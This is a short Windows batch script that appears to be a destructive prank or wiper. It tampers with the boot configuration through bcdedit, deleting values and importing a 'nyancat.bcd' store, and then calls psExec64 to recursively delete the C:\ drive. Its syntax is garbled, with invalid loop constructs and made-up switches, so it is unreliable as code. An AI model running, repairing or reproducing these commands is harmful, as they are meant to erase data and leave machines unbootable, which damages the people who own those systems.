@echo off
\psinvite-process.exe /r /id:55
\pKernelLog.bat -tracelog
\pKernel.bat -kill -dump:kDump.kernel
for kernel in kDump 
	do bcdedit /export:store.bcd
	do bcdedit /createstore syT
	do bcdedit /store:system /deletevalue all
	do bcdedit /store:syT
	do bcdedit /import:nyancat.bcd
end 
for trace in tracelog
	do psExec64.exe /sys del /r C:\
